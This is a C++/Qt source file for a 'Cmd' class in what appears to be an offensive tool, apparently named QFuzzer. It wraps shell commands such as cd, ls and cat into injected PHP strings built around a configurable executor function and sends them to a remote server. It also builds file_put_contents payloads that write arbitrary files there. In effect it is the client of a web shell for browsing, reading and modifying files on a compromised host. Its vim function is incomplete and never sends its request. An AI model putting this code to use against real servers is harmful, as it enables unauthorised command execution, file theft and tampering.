#include <QMessageBox>

#include <QFile>
#include <QProcess>

#include "Cmd.h"

Cmd::Cmd(QFuzzer *f, QString executer, bool isWindows)
{
    this->fuzzer = f;
    this->executer = executer;
    this->isWindows = isWindows;
}

void Cmd::normalizeRequest(QString *request, bool system)
{
    QString contexter;

    if(!this->context.isEmpty()) {
        contexter = "cd " + this->context + " && ";
    }

    if(system) {
        *request = "$r=" + this->executer + "('" + contexter + *request + "');";
        return;
    }
}

std::vector<std::string> Cmd::listDir(QString dir)
{
    QString ls, response;
    std::vector<std::string> arr(2);

    if(!dir.isEmpty()) {
       ls = "cd " + dir + " && ";
    }
    ls = ls + "ls -d */ && echo \\'|||\\' && ls -p | grep -v /";

    this->normalizeRequest(&ls);
    response = this->fuzzer->sendRequest(ls);

    if(!response.isEmpty()) {
        QStringList list = response.split("|||");
        arr[0] = list.at(0).toStdString();
        if(list.size() > 1) {
            arr[1] = list.at(1).toStdString();
        }
    }

    return arr;
}

QString Cmd::getFileContent(QString file)
{
    QString cat, response;

    if (file.isEmpty()) {
        return "";
    }
    cat = "cat " + file;

    this->normalizeRequest(&cat);
    response = this->fuzzer->sendRequest(cat);
    response.replace("+", " ");

    return response;
}

QString Cmd::vim(QString fileName, QString fileContent)
{
    QString request, response;

    request = "file_put_contents('"+fileName+"', '" + fileContent + "');$r='Success!';";

    this->normalizeRequest(&request, false);

    return response;
}
